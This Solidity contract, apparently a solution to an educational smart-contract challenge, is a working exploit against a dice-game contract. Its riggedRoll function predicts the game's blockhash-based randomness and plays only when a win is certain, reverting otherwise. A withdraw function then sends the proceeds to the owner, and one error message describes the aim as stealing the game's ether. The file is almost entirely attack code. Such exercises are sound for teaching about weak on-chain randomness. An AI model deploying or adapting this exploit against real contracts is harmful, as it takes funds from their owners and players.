pragma solidity >=0.8.0 <0.9.0;
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {

    DiceGame public diceGame;

    constructor(address payable diceGameAddress) {
        diceGame = DiceGame(diceGameAddress);
    }

    // @notice Add withdraw function to transfer ether from the rigged contract to owner address
    function withdraw() onlyOwner public {
        uint256 amount = address(this).balance;
        (bool sent,) = msg.sender.call{value : amount}("");
        require(sent, "Failed to send Ether");
    }


    // @notice Add riggedRoll() function to predict the randomness in the DiceGame contract and only roll when it's going to be a winner
    function riggedRoll() public {
        require( address(this).balance >= 0.002 ether, "Not enough ether to steal the DiceGame contract");
        bytes32 prevHash = blockhash(block.number - 1);
        bytes32 hash = keccak256(abi.encodePacked(prevHash, address(diceGame), diceGame.nonce()));
        uint256 roll = uint256(hash) % 16;
        console.log("THE ROLL IS ", roll);
        if (roll <= 2) {
            diceGame.rollTheDice{value: 0.002 ether}();
        } else {
            // Add a revert to refund any remaining gas to the caller.
            revert("The roll is lose so revert");
        }
    }

    // @notice Add receive() function so contract can receive Eth
    receive() external payable {}

}
